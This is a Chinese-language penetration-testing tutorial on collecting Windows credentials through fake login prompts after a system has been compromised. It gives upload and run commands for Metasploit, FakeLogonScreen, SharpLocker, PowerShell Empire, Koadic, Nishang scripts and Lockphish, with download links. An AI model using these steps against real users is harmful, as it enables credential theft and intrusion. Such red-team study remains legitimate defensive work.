**在本文中，我们将使用钓鱼技术来收集凭据。**

## Metasploit框架：phish_windows_credentials

Metasploit带有内置的后期漏洞利用功能，可帮助我们完成任务。由于它是后渗透的模块，因此只需要输入会话即可：

    
    
    use post/windows/gather/phish_windows_credentials 
    
    set session 1 
    
    exploit

![](https://image.3001.net/images/20200423/1587624516_5ea13a44c7ab5.png!small)

该模块等待用户开始新的过程。启动该过程后，将打开一个虚假的Windows安全对话框，要求用户提供凭据，如下图所示：

![](https://image.3001.net/images/20200423/1587624516_5ea13a44c6df3.png!small)

当用户输入其凭据时，它们将被捕获并显示，如下图所示：

![](https://image.3001.net/images/20200423/1587624518_5ea13a4678df2.png!small)

## FakeLogonScreen

FakeLogonScreen工具由Arris
Huijgen创建。它是用C＃开发的，因为它允许程序注入内存中。我们将使用Metasploit远程执行此工具。但是首先，让我们使用下面提供的链接下载该工具

> [下载FakeLogonScreen](https://github.com/bitsadmin/fakelogonscreen/releases)

我们只需从meterpreter会话中上传此工具，然后使用以下命令远程执行它：

    
    
    upload /root/FakeLogonScreen.exe . 
    
    shell 
    
    FakeLogonScreen.exe

![](https://image.3001.net/images/20200423/1587624518_5ea13a46415f5.png!small)

执行后，它将模拟Windows锁定屏幕以从用户获取密码。为此，此工具将显示与配置完全相同的锁定屏幕，以使用户不会感到可疑，如下图所示：

![](https://image.3001.net/images/20200423/1587624534_5ea13a569d082.png!small)

当用户输入凭据时，它将在本地或从域控制器验证凭据，然后将其显示在控制台上，如下图所示：

![](https://image.3001.net/images/20200423/1587624583_5ea13a870e847.png!small)

## SharpLocker

此工具与以前的工具非常相似。它是由Matt
Pickford开发的。就像FakeLogonScreen一样，此工具也将显示伪造的锁定屏幕，供用户输入凭据，然后将击键的内容转储给攻击者。

>
> [下载SharpLocker](https://github.com/Pickfordmatt/SharpLocker/releases/tag/v0.5)

我们将首先将该工具从攻击者机器上载到目标系统，然后执行它。因此，当您有meterpreter会话时，只需键入：

    
    
    upload /root/Downloads/SharpLocker.exe . 
    
    shell
    
    SharpLocker.exe

我们将该工具下载到了桌面上，因此我们将遍历该位置然后执行它

![](https://image.3001.net/images/20200423/1587624524_5ea13a4c3e9e7.png!small)

执行后，该工具将触发目标系统的锁定屏幕，如下图所示：

![](https://image.3001.net/images/20200423/1587624536_5ea13a58c55d3.png!small)

当用户输入密码时，它将捕获按键，直到显示整个密码为止，如下图所示：

![](https://image.3001.net/images/20200423/1587624536_5ea13a587c39c.png!small)

## PowerShell Empire

PowerShell Empire的此模块将在目标系统上提示一个对话框，要求像我们之前所做的那样获得凭据。我们可以通过以下命令使用此模块：

    
    
    usemodule collection/prompt 
    
    execute

![](https://image.3001.net/images/20200423/1587624538_5ea13a5a2eebf.png!small)

用户在对话框中输入凭据后，模块将在终端上显示该凭据，如下图所示：

![](https://image.3001.net/images/20200423/1587624539_5ea13a5b3d959.png!small)

## collection/toasted

PowerShell Empire的此模块触发重启通知，就像需要更新并重新启动安装时生成的那样。要使用此模块，以下命令：

    
    
    usemodule collection/toasted 
    
    execute

![](https://image.3001.net/images/20200423/1587624539_5ea13a5bcb569.png!small)

模块执行后，将显示以下对话框：

![](https://image.3001.net/images/20200423/1587624546_5ea13a62e2ed5.jpg!small)

单击“Postpone”按钮后，它将要求提供凭据以验证推迟决策，如下图所示：

![](https://image.3001.net/images/20200423/1587624547_5ea13a631017e.png!small)

当用户输入凭据时，它将打印它们，如下图所示：

![](https://image.3001.net/images/20200423/1587624547_5ea13a636de3b.png!small)

## Koadic

可以在Koadic中找到与PowerShell Empire中的模块类似的模块。使用Koadic进行会话后，请使用以下命令触发对话框：

    
    
    use password_box 
    
    execute

![](https://image.3001.net/images/20200423/1587624548_5ea13a6404ff9.png!small)

当用户在对话框中输入用户名和密码时，密码也将显示在终端中，如下图所示：

![](https://image.3001.net/images/20200423/1587624548_5ea13a6474e8c.png!small)

## PowerShell：Invoke-CredentialsPhish.ps1

有一个可以在PowerShell上运行的脚本，该脚本会创建伪造的登录提示，供用户输入凭据。

> [下载Invoke-> CredentialsPhish.ps1](https://raw.githubusercontent.com/samratashok/nishang/master/Gather/Invoke-> CredentialsPhish.ps1)

要启动脚本，请键入：

    
    
    Import-Module C:\Users\raj\Desktop\Invoke-CredentialsPhish.ps1 
    
    Invoke-CredentialsPhish

执行以上命令将弹出提示询问凭据的提示，如下图所示：

![](https://image.3001.net/images/20200423/1587624548_5ea13a6494498.png!small)

因此，用户输入凭据后，它们将显示在屏幕上，如下图所示：

![](https://image.3001.net/images/20200423/1587624550_5ea13a66107b6.png!small)

## PowerShell：Invoke-LoginPrompt.ps1

同样，Matt Nelson还开发了另一个脚本。该脚本将再次打开一个对话框，供用户输入密码。

> [下载Invoke-> LoginPrompt.ps1](https://raw.githubusercontent.com/enigma0x3/Invoke-> LoginPrompt/master/Invoke-LoginPrompt.ps1)

要启动脚本，请输入以下内容：

    
    
    Import-Module C:\Users\raj\Desktop\Invoke-LoginPrompt.ps1 
    
    Invoke-LoginPrompt.ps1

![](https://image.3001.net/images/20200423/1587624550_5ea13a669d163.png!small)

如您所见，对话框将出现在屏幕上，并且用户输入了凭据，然后它们将再次显示在终端上。

![](https://image.3001.net/images/20200423/1587624551_5ea13a6721c89.png!small)

## Lockphish

Lockphish是另一个允许我们仿冒凭据的工具，您可以从[此处](https://github.com/thelinuxchoice/lockphish.git)下载该工具。该工具会创建一个模板，该模板看起来像是将用户重定向到YouTube视频，该模板将托管在PHP服务器中，但是它将提示用户输入登录凭据，然后将其发送给攻击者。

使用以下命令启动该工具：

    
    
    ./lockphish.sh

![](https://image.3001.net/images/20200423/1587624551_5ea13a679ea20.png!small)

如上图所示，它将使用ngrok生成链接，并将该链接发送到目标。当目标访问链接时，它询问用户是否保存文件。

![](https://image.3001.net/images/20200423/1587624552_5ea13a686edfb.png!small)

在用户输入凭据后，它将把用户重定向到YouTube。

![](https://image.3001.net/images/20200423/1587624552_5ea13a685c87c.png!small)

然后，在执行下载的文件时，将触发锁定屏幕，并且将迫使用户输入凭据，如下图所示：

![](https://image.3001.net/images/20200423/1587624553_5ea13a6958de8.png!small)

这样，我们将拥有我们的凭据，如下图所示：

![](https://image.3001.net/images/20200423/1587624561_5ea13a711b444.png!small)

## 结论

这些是我们可以用来转储目标系统凭据的各种方法。根据情况，应使用适当的方法来转储凭据。PowerShell方法最好用于验证凭据，因为在输入正确的凭据之前提示不会关闭。Lockphish方法无法像其他工具一样准确地创建锁定屏幕，并且它也不会验证凭据。因此，每种方法和工具都有其优点和缺点。但是他们都还不错。

 **参考来源:[hackingarticles](https://www.hackingarticles.in/credential-dumping-phishing-windows-credentials/)，FB小编周大涛编译，转载请注明来自FreeBuf.COM**

